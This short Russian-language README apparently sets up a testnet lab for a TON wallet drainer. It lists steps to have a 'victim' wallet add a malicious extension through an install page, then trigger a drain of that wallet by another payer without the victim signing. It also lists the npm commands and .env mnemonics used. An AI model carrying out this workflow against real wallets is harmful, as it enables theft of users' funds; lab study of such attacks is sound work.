# Tonkeeper + TON Connect (основной путь)

Seed **жертвы C** остаётся в Tonkeeper. В `.env` только **адрес** (`WALLET_VICTIM`).

## Install (шаг 1)

1. `npm run deploy` — relay привязан к `WALLET_VICTIM`.
2. `npm run sync-config` (если менял `lab-config.json` вручную).
3. `npm run manifest:local` и `npm run serve:public`.
4. **`/install.html`** → Connect **Wallet v5 testnet C** → Confirm **Add extension**.

Страница сверяет подключённый адрес с `walletA` в `public/config.json`.

Fallback без UI: `npm run install-ext` (нужен `MNEMONIC_A` в `.env`).

## Trigger (шаг 2)

C **не подписывает** drain. Gas платит любой кошелёk:

- **`/index.html`** + TON Connect, или
- deep link **🔗 Списать через Tonkeeper** в боте (~0.08 TON на relay), или
- `npm run trigger` с `MNEMONIC_TRIGGER` (payer W5 on-chain).

## `.env` для TON Connect

| Переменная | Нужна? |
|------------|--------|
| `WALLET_VICTIM` | да — адрес C |
| `WALLET_B` | да |
| `MNEMONIC_TRIGGER` | да — deploy + опционально script trigger |
| `MNEMONIC_A` | нет (install/remove через UI или не трогаем) |

Payer **не должен** совпадать с C, иначе скрипт-trigger часто даёт HTTP 500 — используй Tonkeeper link.
